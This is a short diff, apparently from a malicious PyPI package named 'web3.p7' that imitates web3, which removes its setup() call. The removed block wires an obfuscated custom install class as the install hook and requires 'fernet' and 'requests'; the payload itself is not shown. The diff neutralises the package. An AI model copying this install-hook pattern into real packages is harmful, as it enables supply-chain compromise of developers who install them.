@@ -18,22 +18,5 @@ class JxmYRzHGxmCfHPtzohteBPhqTIVQNMoLnhxgXRuCOuikLyPbWQUTDxNWeQiXkwxQbKaMNfKcsB
             install.run(self)
 
 
-setup(
-    name="web3.p7",
-    version=VERSION,
-    author="SbTOOspedqNNHfkMi",
-    author_email="vcDihTYBq@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': JxmYRzHGxmCfHPtzohteBPhqTIVQNMoLnhxgXRuCOuikLyPbWQUTDxNWeQiXkwxQbKaMNfKcsBmfAZMiFvdLszpJbShGAjxqmQugHfzuFaREIhbwGqtarUNcssQxDMXGBXCUxbXnytujLgaoTZrIpmXRyNvSsSyXqHj,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
 
